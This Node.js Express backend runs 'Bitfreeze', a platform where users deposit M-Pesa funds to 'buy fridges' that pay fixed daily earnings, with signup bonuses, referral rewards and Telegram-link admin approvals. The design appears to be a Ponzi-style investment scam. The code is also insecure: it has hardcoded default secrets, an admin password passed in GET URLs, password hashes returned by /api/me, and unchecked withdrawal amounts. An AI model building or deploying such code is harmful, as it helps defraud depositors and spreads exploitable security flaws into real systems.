require('dotenv').config();
const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const mongoose = require('mongoose');
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET = process.env.BF_SECRET || 'bitfreeze_secret';
const DOMAIN = process.env.DOMAIN || 'https://bitfreeze-production.up.railway.app';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin-pass';

// Telegram
const TG_BOT = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT = process.env.TELEGRAM_CHAT_ID;

// Middleware
app.use(bodyParser.json());
app.use(cors({ origin: DOMAIN }));
app.use(express.static(path.join(__dirname, 'public')));

// ===================== FRIDGES & DEPOSITS =====================
const FRIDGES = [
  { id: '2ft', price: 500, daily: 25 },
  { id: '4ft', price: 1000, daily: 55 },
  { id: '6ft', price: 2000, daily: 100 },
  { id: '8ft', price: 4000, daily: 150 },
  { id: '10ft', price: 6000, daily: 250 },
  { id: '12ft', price: 8000, daily: 350 }
];
const ALLOWED_DEPOSITS = FRIDGES.map(f => f.price);

// Referral tiers
const REFERRAL_TIERS = [
  { min: 8000, reward: 500 },
  { min: 6000, reward: 350 },
  { min: 4000, reward: 250 },
  { min: 2000, reward: 150 },
  { min: 1000, reward: 100 },
  { min: 500, reward: 50 },
];

// ===================== SCHEMAS =====================
const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  password: String,
  depositBalance: { type: Number, default: 0 },
  earningsBalance: { type: Number, default: 200 },
  lockedBonus: { type: Number, default: 200 },
  fridges: { type: Array, default: [] },
  firstDepositMade: { type: Boolean, default: false },
  referredBy: String,
  referrals: { type: Array, default: [] },
  lastPaid: String,
  createdAt: { type: Date, default: Date.now }
});

const depositSchema = new mongoose.Schema({
  id: String,
  email: String,
  amount: Number,
  mpesaCode: String,
  phone: String,
  status: String
});

const withdrawalSchema = new mongoose.Schema({
  id: String,
  email: String,
  amount: Number,
  phone: String,
  status: String
});

const User = mongoose.model('User', userSchema);
const Deposit = mongoose.model('Deposit', depositSchema);
const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);

// ===================== HELPERS =====================
function auth(req, res, next) {
  const h = req.headers.authorization;
  if (!h) return res.status(401).json({ error: 'No token' });
  try {
    req.user = jwt.verify(h.split(' ')[1], SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

async function tgSend(text, buttons) {
  if (!TG_BOT || !TG_CHAT) return;
  const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML' };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  }).catch(e => console.error(e));
}

// ===================== ROUTES =====================

// Register
app.post('/api/register', async (req, res) => {
  const { name, email, password, referrerEmail } = req.body;
  if (!name || !email || !password) return res.status(400).json({ error: 'All fields required' });

  const hashed = await bcrypt.hash(password, 10);

  const user = new User({
    name,
    email,
    password: hashed,
    earningsBalance: 200,
    lockedBonus: 200,
    referredBy: referrerEmail?.trim() || undefined
  });

  await user.save();

  // Referral reward
  if (user.referredBy) {
    const ref = await User.findOne({ email: user.referredBy });
    if (ref) {
      // Reward based on first deposit of the referred user
      // Since user hasn't deposited yet, we save reward after approval
      ref.referrals.push(user.email);
      await ref.save();
    }
  }

  const token = jwt.sign({ email }, SECRET, { expiresIn: '7d' });
  res.json({ message: 'Registered successfully. 200 KES bonus added (locked until first deposit)', token });
});

// Login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  if (!user) return res.status(400).json({ error: 'Invalid credentials' });
  const ok = await bcrypt.compare(password, user.password);
  if (!ok) return res.status(400).json({ error: 'Invalid credentials' });
  const token = jwt.sign({ email }, SECRET, { expiresIn: '7d' });
  res.json({ token });
});

// Deposit
app.post('/api/deposit', auth, async (req, res) => {
  const { amount, mpesaCode, phone } = req.body;
  if (!ALLOWED_DEPOSITS.includes(Number(amount))) {
    return res.status(400).json({ error: 'Deposit the exact amount of the fridge you want (min 500)' });
  }

  const pending = await Deposit.findOne({ email: req.user.email, status: 'PENDING' });
  if (pending) return res.status(400).json({ error: 'You have a pending deposit' });

  const dep = new Deposit({ id: crypto.randomUUID(), email: req.user.email, amount, mpesaCode, phone, status: 'PENDING' });
  await dep.save();

  await tgSend(`🟢 New deposit request\nEmail: ${req.user.email}\nAmount: ${amount}\nPhone: ${phone}\nID: ${dep.id}`, [
    [{ text: '✅ Approve', url: `${DOMAIN}/api/admin/deposit/${dep.id}/approve?token=${ADMIN_PASS}` }],
    [{ text: '❌ Reject', url: `${DOMAIN}/api/admin/deposit/${dep.id}/reject?token=${ADMIN_PASS}` }]
  ]);

  res.json({ message: 'Deposit submitted for admin approval' });
});

// Approve Deposit
app.get('/api/admin/deposit/:id/approve', async (req, res) => {
  if (req.query.token !== ADMIN_PASS) return res.send('Unauthorized');
  const dep = await Deposit.findOne({ id: req.params.id });
  if (!dep || dep.status !== 'PENDING') return res.send('Invalid deposit');

  dep.status = 'APPROVED'; await dep.save();
  const user = await User.findOne({ email: dep.email });
  user.depositBalance += dep.amount;

  // Unlock registration bonus after first deposit >= 500
  if (!user.firstDepositMade && dep.amount >= 500) {
    user.firstDepositMade = true;
    user.earningsBalance += user.lockedBonus;
    user.lockedBonus = 0;

    // Give referral reward based on deposit
    if (user.referredBy) {
      const ref = await User.findOne({ email: user.referredBy });
      if (ref) {
        const tier = REFERRAL_TIERS.find(t => dep.amount >= t.min);
        if (tier) ref.earningsBalance += tier.reward;
        await ref.save();
      }
    }
  }

  await user.save();
  res.send('Deposit approved');
});

// Withdraw
app.post('/api/withdraw', auth, async (req, res) => {
  const { amount, phone } = req.body;
  const user = await User.findOne({ email: req.user.email });

  if (!user.firstDepositMade) return res.status(400).json({ error: 'Deposit required before withdrawal' });
  if (user.earningsBalance < amount) return res.status(400).json({ error: 'Insufficient earnings' });

  const w = new Withdrawal({ id: crypto.randomUUID(), email: user.email, amount, phone, status: 'PENDING' });
  await w.save();

  user.earningsBalance -= amount;
  await user.save();

  await tgSend(`🔵 New withdrawal request\nEmail: ${user.email}\nAmount: ${amount}\nPhone: ${phone}\nID: ${w.id}`, [
    [{ text: '✅ Approve', url: `${DOMAIN}/api/admin/withdraw/${w.id}/approve?token=${ADMIN_PASS}` }],
    [{ text: '❌ Reject', url: `${DOMAIN}/api/admin/withdraw/${w.id}/reject?token=${ADMIN_PASS}` }]
  ]);

  res.json({ message: 'Withdrawal submitted' });
});

// Approve Withdraw
app.get('/api/admin/withdraw/:id/approve', async (req, res) => {
  if (req.query.token !== ADMIN_PASS) return res.send('Unauthorized');
  const w = await Withdrawal.findOne({ id: req.params.id });
  if (!w || w.status !== 'PENDING') return res.send('Invalid withdrawal');

  w.status = 'APPROVED'; await w.save();
  res.send('Withdrawal approved');
});

// Buy fridge
app.post('/api/buy', auth, async (req, res) => {
  const { fridgeId } = req.body;
  const f = FRIDGES.find(fr => fr.id === fridgeId);
  if (!f) return res.status(400).json({ error: 'Invalid fridge' });

  const u = await User.findOne({ email: req.user.email });
  if (u.depositBalance < f.price) return res.status(400).json({ error: 'Insufficient deposit balance' });

  u.depositBalance -= f.price;
  u.fridges.push({ id: f.id, daily: f.daily });
  await u.save();
  res.json({ message: 'Fridge purchased' });
});

// Daily Earnings
async function runDailyEarnings() {
  const today = new Date().toLocaleDateString('en-GB', { timeZone: 'Africa/Nairobi' });
  const users = await User.find();
  for (const u of users) {
    if (u.lastPaid === today) continue;
    let earn = 0;
    for (const f of u.fridges) earn += f.daily;
    if (earn > 0) {
      u.earningsBalance += earn;
      u.lastPaid = today;
      await u.save();
    }
  }
}
setInterval(runDailyEarnings, 60000); // check every minute

// Profile
app.get('/api/me', auth, async (req, res) => {
  const user = await User.findOne({ email: req.user.email });
  res.json(user);
});

// Status
app.get('/api/status', (req, res) => res.json({ status: 'ok', time: Date.now() }));

// Start server
app.listen(PORT, () => console.log(`Bitfreeze running on ${PORT}`));
